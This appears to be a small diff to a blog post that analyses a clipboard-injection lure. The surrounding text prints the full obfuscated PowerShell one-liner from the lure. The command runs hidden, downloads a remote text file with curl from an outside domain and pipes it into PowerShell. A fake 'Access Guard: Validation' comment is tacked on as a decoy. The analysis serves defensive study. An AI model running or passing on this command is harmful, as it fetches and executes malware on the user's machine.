@@ -24,7 +24,7 @@ If we follow the instructions, we notice that something is copied to our clipboa
 <img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/3.png" alt="PowerShell Infection">
 
 However, when we paste the command into a text editor, we quickly realize it reveals something much different from what we initially expected.
-```PowerShell
+```powershell
 PoWERSHElL -w M"in"i"m"ized c"Url.E"X"e" -k -L --"re"try 9"9"9  ht"tps:/"/"dy"b"e"p.fu"n"/"fb8"8"c"1eb2"1"d"4"f"e2"71"2"723729a"d2"f"e"7"38.tx"t | powe"r"shell -;" ð Access Guard: Validation. RefID: 45ab26cf05b6abc95f
 ```
 Before we delve into the specifics of what this command does and the techniques it employs, it’s crucial to first understand how this command made its way into our clipboard.
